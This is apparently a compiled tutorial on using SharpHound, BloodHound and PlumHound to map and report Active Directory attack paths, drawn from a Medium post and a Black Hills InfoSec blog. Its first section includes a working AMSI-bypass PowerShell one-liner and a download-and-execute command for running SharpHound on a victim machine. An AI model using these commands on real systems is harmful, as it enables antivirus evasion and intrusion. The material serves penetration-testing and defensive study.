BloodHound is a graphical tool both attackers and defenders use to reveal secrets and hidden relationships within an Active Directory environment. In this case, though BloodHound is used for identifying and eliminating attack paths for Blue Teams, it is also used by Red Teams and malicious APT groups to discover hidden tracks for lateral movement in an Active Directory domain.

# 1. SharpHound

In order to graph data via BloodHound, SharpHound should be executed on the victim machine for data collection regarding the information in an Active Directory domain. SharpHound is the official data collector for BloodHound and can be found as both in PowerShell script and C# (compiled to .exe).

Without any flags given to SharpHound, the information below can be collected into a zip file:

- Security group memberships
- Domain trusts
- Abusable rights on Active Directory objects
- Group Policy links
- OU tree structure
- Several properties from computer, group and user objects
- SQL admin links
- The members of the local administrators, remote desktop, distributed COM, and remote management groups
- Active sessions, which SharpHound will attempt to correlate to systems where users are interactively logged on

More information can be found in the official document site of BloodHound:¬†[https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)

P.S. Firstly, some AMSI-Bypass won‚Äôt hurt if these below don‚Äôt work. Check out¬†[https://amsi.fail/](https://amsi.fail/)¬†and my teammate F‚Äôs fav (Hey¬†[ZemarKhos](https://github.com/ZemarKhos)¬†üôå):

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like ‚Äú*iUtils‚Äù) {$c=$b}};$d=$c.GetFields(‚ÄòNonPublic,Static‚Äô);Foreach($e in $d) {if ($e.Name -like ‚Äú*Context‚Äù) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

Method 1: SharpHound can be downloaded on the attacker machine as ‚ÄúSharpHound.ps1‚Äù, imported and executed with the Collection Method of ‚Äúall‚Äù for the most information about the domain.

powershell -ep bypass. .\Sharphound.ps1Invoke-Bloodhound -CollectionMethod All -Domain <DOMAIN_NAME>

![](https://miro.medium.com/v2/resize:fit:624/1*05bybHPY_jnP9ojrz3Sm2w.png)

**Method 2:**¬†SharpHound can be downloaded and executed in the victim machine with an example oneliner below:

powershell -ep bypass "IEX(New-Object Net.Webclient).DownloadString('[https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)');Invoke-Bloodhound"

![](https://miro.medium.com/v2/resize:fit:700/1*Lvhkqx_txs5xrqvXbo1M5g.png)

The output zip file should be uploaded to the attacker machine for further investigation of the related domain.

# 2. BloodHound

The output zip file which was downloaded earlier should be imported to BloodHound. BloodHound can be downloaded in Linux machines with the commands below:

apt install bloodhoundneo4j console  // Open the console on your browser.   username: neo4j   password: neo4j  // Asks you to change the password.bloodhound   username: neo4j   password: <new password>

The output zip file can be imported from ‚ÄúUpload Data‚Äù button on the right of the BloodHound GUI screen.

![](https://miro.medium.com/v2/resize:fit:138/1*O0W1AmzijttVCkl7LQkMSA.png)

After the upload completes, pre-build queries and their graphs can be observed:

![](https://miro.medium.com/v2/resize:fit:343/1*cbkA-Ix9q136zi0Jf6PO8w.png)

An example from the demonstration can be seen below:

![](https://miro.medium.com/v2/resize:fit:626/1*MaNK5SSCBKdCepJKuQ8UdQ.png)

# 3. PlumHound

Although BloodHound is a powerful tool to graph Active Directory, it can be mind-bending to correlate between information on maps of large networks‚Ä¶ like, you know... like this:

![](https://miro.medium.com/v2/resize:fit:383/1*qdxB7QL1YTTrwTd7j9sRZQ.png)

To end the confusion over graphs, a new tool was introduced: PlumHound. PlumHound, which was essentially written for Blue and Purple Teams, operates by wrapping BloodHoundAD‚Äôs Neo4J backend cipher queries into reports. Blue and Purple Teams can identify and harden Active Directory configuration vulnerabilities by analyzing the output reports of PlumHound.

A collection output of SharpHound and an operating BloodHound should be active to generate reports with PlumHound. Installation and usage can be found below:

git clone [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound)apt-get install python3cd PlumHoundpip3 install -r requirements.txtpython3 PlumHound.py -x tasks/default.tasks -s "bolt://127.0.0.1:7687" -u "neo4j" -p "<password>" -v 0 --HTMLCSS template/html.css

All reports can be accessed from the directory: ‚ÄúPlumHound/reports/Reports.html‚Äù

Reports include (a long list I cannot write!):

- Domain Users
- Domain Controllers
- Kerberoastable Users
- RDPable Servers
- Unconstrained Delegation Computers with SPN
- Admin Groups
- RDPable Groups
- RDPable Groups Count
- LocalAdminGroups

Screenshots of the report samples from the demonstration can be seen below:

![](https://miro.medium.com/v2/resize:fit:434/1*bE8v_pOJGDljJO-vGF_kOQ.png)

![](https://miro.medium.com/v2/resize:fit:626/1*OnJvzig93qwEseE63w-xTw.png)

![](https://miro.medium.com/v2/resize:fit:404/1*gzSarLRqTyLmhU_RGD3EaQ.png)

![](https://miro.medium.com/v2/resize:fit:626/1*dkt0ZNM3DKHPC1_n2FRg0Q.png)

![](https://miro.medium.com/v2/resize:fit:403/1*UaWn36lw7ZOWu_c3FCOzpg.png)

Happy hunting? :)

**Credit:**¬†This information was adapted from an excellent guide on¬†[Medium](https://cesidt.medium.com/bloodhound-plumhound-bbd5f8a60f00). Be sure to check out the original post for more details.

# [PlumHound Reporting Engine for BloodHoundAD](https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/)

[Kent Ickler](https://twitter.com/KRelkci)¬†//

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/BLOG_chalkboard_00606-1024x576.jpg)

It‚Äôs been over two years since Jordan and I talked about a Blue Team‚Äôs perspective on Red Team tools.¬†¬†

[A Blue Team‚Äôs Perspective on Red Team Hack Tools ‚Äì YouTube](https://www.youtube.com/watch?v=0mIN2OU5hQE)¬†

The webcast itself had interesting topics; at the end of the discussion, we talked about a tool we wrote. PlumHound is a report engine for BloodHoundAD to make actionable reports for Blue Teams, Systems Administrators, and Analysts.¬†We figured it‚Äôs about time we got around to writing this blog.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture3.png)

The framework for PlumHound is relatively simple: utilize the control path-finding capabilities of BloodHoundAD in Neo4j to build actionable intelligence for blue teams to identify Active Directory problems.¬†¬†¬†

A while into development, we ran into Mathieu Saulnier ([Scoubi](https://github.com/Scoubi)) who had a similar project.¬†Finding similar objectives, we merged our efforts. Mathieu brought in additional modules that would identify the weakest link (AnalyzePath) to a control path vulnerability and the most important paths to remediate first (BusiestPath) to be most effective‚Äî both modules of his BlueHound project.

On pentests where we found interesting control path vulnerabilities, we took a few moments to analyze the condition and, if it was something new, write a new PlumHound report using Neo4j cyphers.¬†Meanwhile, other information security teams began to use the report engine to build their own reports as well.¬†

Today, we have 69 PlumHound reports in the packaged ‚ÄúDefault‚Äù reports, plus the Busiest Path and Analyze Path functions of Mathieu Saulnier‚Äôs BlueHound.¬†

### ****So, how does it all work?****

First off, we have to acknowledge that we stand on the shoulders of the giants that built Neo4j, BloodHoundAD, and its data collectors.¬†With that said, PlumHound uses Python to connect to the Neo4j database after BloodHoundAD has ingested and parsed data. PlumHound then uses Neo4j‚Äôs cypher language to query its database for information and output that information into CSV or HTML reports (or, alternatively, to standard output). That is, the BloodHoundAD analysis can be normalized into a reporting format that can be consumed for data-driven decision making about correcting common Active Directory control path vulnerabilities.¬†

#### Running PlumHound Report Engine¬†

Running PlumHound is easy:¬†specify the Neo4j database connection and specify the ‚Äútask-list‚Äù you want to do.¬†Task-lists are sets of cypher queries and metadata that tell PlumHound what query to run and how to generate a report from the output.¬†The ‚ÄúDefault‚Äù task-list included with PlumHound includes 69 reports plus an index.¬†

To shorthand things even further, if your Neo4j server is on localhost, you won‚Äôt need to specify a Neo4j connection.¬†¬†

For versions of Neo4j that still use ‚Äúdefault‚Äù credentials, you must first update the default credentials to use the service.¬†If you‚Äôre like me, you source-filter the Neo4j service and update credentials to be something‚Ä¶ easy‚Ä¶ lazy‚Ä¶ terrible?¬† Anyway, I change the password from ‚Äúneo4j‚Äù to ‚Äúneo4jj‚Äù because source-filter the service.¬†Remember, if you source-filtered the service, you will need to run PlumHound from that trusted source.¬†

¬†If your username is ‚Äúneo4j‚Äù and your updated password is ‚Äúneo4jj‚Äù, you won‚Äôt need to specify your username and password to connect to the Neo4j database, because the default is ‚Äúneo4jj‚Äù.¬†

#### It‚Äôs as simple as:

That will execute the default included task-list.¬†¬†¬†

`PlumHound.py -x tasks/default.tasks`¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture4.png)

That‚Äôs it, 69 PlumHound reports + a report index are ready for your review, nice!¬†

##### ****Task Files****¬†

The TaskList files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j.¬†The TaskList file syntax is as follows. (Note that any cypher query containing a double quote must be modified to use a single quote instead of double.)

`["Report Title","[Output-Format]","[Output-File]","[CypherQuery]"]`¬†

### **What reports are packaged in the default list?**¬†¬†¬†

The ‚Äúdefault.tasks‚Äù instructs PlumHound to also generate an index of all the produced reports, index.html.¬†¬†¬†

Opening the index.html file shows us the list of reports. The reports start out pretty typical and provide a general report-based picture of the Active Directory environment.¬†¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture5.png)

Then, our first interesting set of reports. Our test database we used isn‚Äôt super interesting, but each of the reports below provide information that, as penetration testers, we use to find a foothold or escalate privileges on the network. Of course, as a Blue Teamer, we‚Äôd recommend thinking critically about each of the items in these reports.¬†¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture6.png)

Next up, reports that tell us if common or overly-used groups have been potentially mistakenly provided Active Directory delegation.¬†In the group below, PasswordResetter groups let us know that a group has been delegated to reset passwords and will count how many users are delegated to the group.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture7.png)

Next up, reports regarding the domain‚Äôs GPOs and analysis of the GPO owners. Then RDP groups that tell us if RDP access is provisioned via groups and which groups provide access to a count of systems.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture8.png)

Then, reports of Kerberoastable users with the most privileges and an analysis of Local Administrators.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture9.png)

And onto reports about Computer Objects, Operating Systems, and LAPS Deployments.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture10.png)

After computers, we look at user accounts.¬†We report all identified user sessions and users with multiple sessions on different systems.¬†We then look at user accounts with old passwords.¬†We look at users with vulnerable ‚Äúuserpassword‚Äù attributes and users with no Kerberos pre-authentication needed. We also have reports of users with administrative control of a system both directly and indirectly. Users with ‚ÄúAdd To Group Delegation‚Äù tell us which users have been delegated to change group membership ‚Äì both directly and indirectly.¬†We report on users that have never logged in, and finally, users that are never required to change their passwords.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture11.png)

Finally, we have reports that are populated by the user of BloodHoundAD‚Äôs ‚ÄúOwned‚Äù flags, allowing an analyst to produce detailed reports of post-exploitation, defining exactly which user and computer accounts were compromised during an engagement.¬†¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture12.png)

#### Cyphers Included¬†

Each of the produced reports includes the cypher query used to generate the report.¬†While useful for troubleshooting and developing the reports, it also allows the analyst the ability to utilize the cypher query as an ingest to other tooling.¬†¬†¬†

In the below report, ‚ÄúGPO Creators Owners‚Äù, we see that¬†[ASADMIN@ASAZLAB.com](mailto:ASADMIN@ASAZLAB.com)¬†is a GPO Creator/Owner.¬†Included in the report are the date and time the report was executed, as well as the cypher query used to generate the report.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture13.png)

#### How do analysts use these reports?¬†¬†

A penetration tester can find quick information ‚Äì for example: what user accounts don‚Äôt require a password change but have also ever been an admin?¬†The ‚ÄúUser Password Never Expires Exception‚Äù report will tell us just that by checking the ‚ÄúAdminCount‚Äù column.¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture14.png)

A defensive or Blue Team analyst can also use the same reports but with the objective of identifying vulnerable configurations to be remedied.¬†

#### **Single Queries**

PlumHound‚Äôs interface with Neo4j also means that you can quickly and easily execute cypher queries and output directly to the console. In the below example, we query for users that never require a password change.¬†

`./PlumHound.py -q "MATCH (n:User) WHERE n.pwdneverexpires RETURN n.name as Name,n.displayname as DisplayName,n.enabled as Enabled, n.title as Title, n.pwdneverexpires as PWDNeverExpires, n.passwordnotreqd as PWDNotReqd, n.admincount as AdminCount"`¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture15.png)

Even more task-lists

PlumHound also includes other task-lists that are more specific to looking for specific data.¬†For example, we‚Äôve bundled Kerberoasting specific reports into its own task-list.¬† We‚Äôve produced a task-list to generate CSV reports instead of HTML.¬†We also have a task-list that will hunt for interesting things, such as passwords in description, or comment attributes of Active Directory objects.¬†

#### **Analyze Path (BlueHound Module)**¬†

The Analyze path function allows us to identify what relationship to break to stop a control path vulnerability.¬†The command syntax is simple: use flag -ap and specify either user, group, computer, ou, or GPO as a start to the path analysis.¬†

`./PlumHound.py -ap user`¬†

In the below screenshot, user¬†DataAnalyst@asazlab.com¬†has a path to OU ‚ÄúAdminAccounts‚Äù.¬†The output below details the path.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture16.png)

For those more familiar with BloodHound‚Äôs GUI, this is the same representation as below, but indicating the specific relationships to break.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture17.png)

The AnalyzePath query will effectively produce a kill-chain for every vulnerable path by user, group, computer, OU, or group.¬†

#### **Busiest Path (BlueHound Module)**¬†

The Busiest Path finds the shortest (or all) paths that give the most users a path to Domain Admin and gives us number of affected users.¬†The most ‚Äúbusiest path‚Äù is listed first.¬†This informs a team tasked with remediating path vulnerabilities information about which paths to start remediating first to most effectively use their time and effort.¬†

In the case below, we search for the top 5 most user-affected shortest paths to Domain Admin.¬†¬†

`./PlumHound.py -bp short 5`¬†

¬†The first path described below affects six users and is a path starting from group¬†USR_Helpdesk@asazlab.com¬†to Domain Admins¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture18.png)

We can see the path in BloodHoundAD by using the control-paths search:¬†¬†

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture19.png)

### **Verbosity As a Feature?**¬†

This tool was made by someone who doesn‚Äôt write code for a living, or at least not full-time.¬†As a clutch for not writing in a debug IDE, I‚Äôve written in a function that causes the PlumHound tool to have a very configurable debug verbosity.¬†This helps the process of testing cypher queries and writing task lists.¬†¬†¬†

The verbosity argument for PlumHound is -v (number).¬†The verbose number can be 0-1000, where ‚Äú0‚Äù is quiet and 1000 produces a message on every crucial step of the PlumHound process, somewhere in between is just that. Too verbose? Reduce your -v setting. Not enough?¬† Increase it. In addition to this, verbose logging is also configured to review prior logs generated by the tool.¬†

### **Check out PlumHound for Yourself**¬†

We invite you to checkout the PlumHound report engine. We‚Äôve built it open-source to help administrators and analysts make the most of BloodHoundAD‚Äôs control path analysis.¬†

¬†If you find a useful cypher query you want added, let us know, or make a pull request.¬†

GitHub Link:¬†[PlumHound (github.com)](https://github.com/plumhound)¬†

Documentation:¬†[PlumHound | Bloodhound for Blue and Purple Teams](https://www.plumhound.com/)¬†

Interested in knowing more about securing Active Directory and Enterprise environments?¬†Check out our class¬†presented by AntiSyphon Security,¬†_[Defending the Enterprise](https://www.antisyphontraining.com/defending-the-enterprise-w-kent-ickler-and-jordan-drysdale/)_.

**Credit:**¬†This information was adapted from an excellent guide on¬†[BlackHillsInfoSec](https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/obWnQgrpWGI?si=cJ9CtiMNR3cgLLTu" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**N.B.:** @thecybermentor has other notable tools and videos to utilize during the OSCP at [YouTube](@TCMSecurityAcademy)

**Credit:**¬†This information was adapted from an excellent guide on¬†[YouTube](https://www.youtube.com/watch?v=obWnQgrpWGI). Be sure to check out the original post for more details. I cannot give the uploder proper credit as it is obvious that the video is a snippet of Heath Adams tutorial on PlumHound.






